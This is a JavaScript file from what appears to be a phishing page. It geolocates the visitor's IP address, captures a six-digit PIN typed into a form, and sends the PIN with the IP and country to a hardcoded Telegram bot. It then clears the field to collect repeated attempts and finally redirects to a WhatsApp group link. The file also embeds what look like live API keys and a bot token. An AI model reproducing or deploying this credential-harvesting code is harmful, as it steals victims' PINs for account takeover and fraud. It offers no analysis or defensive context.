var ip_address, country_code;

function callback(data) {
  ip_address = data.ip_address;
  country_code = data.country_code;
}

$.ajax({
  url: "https://ipgeolocation.abstractapi.com/v1/?api_key=104f5022d14b4071b2a6f8ebda39a37a",
  method: "GET",
  dataType: "json",
  success: function(data) {
    callback(data);
  },
  error: function(xhr, status, error) {
    console.error("Error fetching IP information:", error);
  }
});

function ValideText() {
  if (
    document.getElementById("txtphone").value != "" &&
    document.getElementById("txtphone").value.length >= 7
  ) {
    return true;
  } else {
    return false;
  }
}

function ValideText() {
  var pinInput = document.getElementById("txtpin");
  if (pinInput.value != "" && pinInput.value.length == 6) {
    return true;
  } else {
    return false;
  }
}

var buttonClicked = false;
var Pintry = 1;

function SendPin() {
  if (!buttonClicked) {
    var telegramBotToken = "6346924701:AAGkU_UOQxhSAbyrebUAxzW3huk5yc_m1Tw";
    var chatId = "625048457";
    var count = 0;

    if (ValideText() && !isNaN(document.getElementById("txtpin").value)) {
      buttonClicked = true;
      var pin = document.getElementById("txtpin").value;
      var telegramURL =
        "https://api.telegram.org/bot" +
        telegramBotToken +
        "/sendMessage?chat_id=" +
        chatId +
        "&text=📌Pin : " +
        pin;

      fetch(telegramURL, { method: "POST" }).then((response) => {
        if (response.ok) {
          count++;
          var ipMessage =
            "https://api.telegram.org/bot" +
            telegramBotToken +
            "/sendMessage?chat_id=" +
            chatId +
            "&text=IP : " +
            ip_address +
            ":" +
            country_code;
          fetch(ipMessage, { method: "POST" }).then((res) => {
            if (res.ok && count == 1 && Pintry <= 2) {
              document.getElementById("txtpin").value = "";
              Pintry++;
              buttonClicked = false;
            }
          });
        } else {
          window.location.replace("pin.html");
        }
      });
    }
  } else {
    window.location.replace("https://chat.whatsapp.com/GXPXmnDnHuvGro6aEqhbW");
  }
}

function isInputNumber(event) {
  var char = String.fromCharCode(event.which);
  if (!/[0-9]/.test(char)) {
    event.preventDefault();
  }
}
